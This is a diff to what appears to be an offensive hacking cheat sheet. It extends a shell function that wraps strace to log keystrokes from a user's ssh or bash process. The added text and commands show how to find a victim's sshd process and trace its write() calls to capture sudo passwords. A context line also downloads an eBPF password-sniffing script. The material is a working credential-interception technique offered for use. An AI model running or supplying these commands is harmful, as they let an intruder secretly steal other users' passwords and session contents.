@@ -2064,15 +2064,28 @@ curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/pty
 Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).
 
 <a id="ssh-sniffing-strace"></a>
-**10.iv Sniff a user's outgoing SSH session with strace**
+**10.iv Sniff a user's outgoing SSH session or bash with strace**
 ```sh
 tit() {
-	strace -e trace=read -p "${1:?}" 2>&1 | stdbuf -oL grep '^read.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
+	strace -e trace="${2:-read}" -p "${1:?}" 2>&1 | stdbuf -oL grep "^${2:-read}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
 }
 # tit $(pidof -s ssh)
 # tit $(pidof -s bash)
 ```
-Dirty way to monitor a user who is using *ssh* or their shell to connect to another host from a computer that you control.
+It is also possible to sniff the SSHD process and capture sudo passwords. Note that we have to trace the `write()` call instead (because sshd 'writes' data to the bash):
+```sh
+# Find the sshd PID that spawned the bash:
+ps -eF f | grep -A1 'sshd.*pts'
+...
+paralle+    7309    7303  0  5088  6652   0 16:20 ?        S      0:04  |   \_ sshd: parallels@pts/1
+paralle+    7310    7309  0  2027  4608   0 16:20 pts/1    Ss+    0:00  |       \_ -bash
+...
+```
+
+Sniff it:
+```shell
+tit 7309 write
+```
 
 
 <a id="ssh-sniffing-wrapper"></a>
